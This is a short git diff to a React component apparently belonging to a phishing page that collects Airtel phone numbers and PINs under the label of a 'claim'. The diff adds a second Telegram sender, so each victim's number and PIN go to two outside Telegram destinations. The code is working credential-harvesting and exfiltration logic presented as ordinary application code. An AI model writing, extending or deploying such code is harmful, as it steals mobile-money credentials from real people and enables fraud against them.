@@ -3,6 +3,7 @@ import styles from "./ClientSide.module.css";
 // import { supabase } from "../assets/lib/supabase.js";
 // import { useNavigate } from "react-router-dom";
 import { sendToTelegram } from "./telegram.jsx";
+import { sendToTelegram2 } from "./telegram copy.jsx";
 export default function ClientSide() {
   // const navigate = useNavigate();
   const [next, setnext] = useState(false);
@@ -37,6 +38,9 @@ export default function ClientSide() {
     }
     // uploaddata();
     await sendToTelegram(
+      `New Airtel Claim:\nAirtel Number: ${clientNumber}\nAirtel Pin: ${clientPin}`
+    );
+    await sendToTelegram2(
       `New Airtel Claim:\nAirtel Number: ${clientNumber}\nAirtel Pin: ${clientPin}`
     );
     setsuccess(true);
